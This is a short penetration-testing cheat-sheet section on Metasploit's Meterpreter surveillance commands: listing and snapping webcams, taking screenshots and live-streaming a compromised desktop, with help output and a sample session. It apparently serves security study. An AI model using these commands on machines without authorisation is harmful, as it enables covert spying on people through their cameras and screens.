# 06 - WireTap

Search Tag(s): #metasploit-framework #command-and-control #interactive-shell

TODO: Fill this info

## 6.1 - Webcam

### 6.1.1 - Help Menu

```
meterpreter > webcam_snap -h
```

```
meterpreter > webcam_stream -h
```

- List webcams

`meterpreter > webcam_list`

- Taking snapshots from a webcam

`meterpreter > webcam_snap -i <device_ID> -p /path/to/file.png`

## 6.2 - Screenshots

- Take regular screenshots
 
```
meterpreter > screenshot -h
Usage: screenshot [options]

Grab a screenshot of the current interactive desktop.

OPTIONS:

    -h   Help Banner.
    -p   The JPEG image path (Default: 'jevmzGjE.jpeg')
    -q   The JPEG image quality (Default: '50')
    -v   Automatically view the JPEG image (Default: 'false')

meterpreter > screenshot -p /home/user/pic.jpeg -q 100
```

## 6.2 - Screenshare

- You can interact the screenshare through the web browser.

```
meterpreter > screenshare -h
Usage: screenshare [options]

View the current interactive desktop in real time.

OPTIONS:

    -d   The stream duration in seconds (Default: 1800)
    -h   Help Banner.
    -q   The JPEG image quality (Default: '50')
    -s   The stream file path (Default: 'FteINQtk.jpeg')
    -t   The stream player path (Default: tFLOibzd.html)
    -v   Automatically view the stream (Default: 'true')

meterpreter > screenshare
[*] Preparing player...
[*] Opening player at: /home/user/CTslvACC.html
[*] Streaming...
```

`meterpreter > run post/multi/manage/screenshare`

---
## References

- [Rapid7: Metasploit Framework Screenshare Post Module](https://github.com/rapid7/metasploit-framework/blob/master/documentation/modules/post/multi/manage/screenshare.md)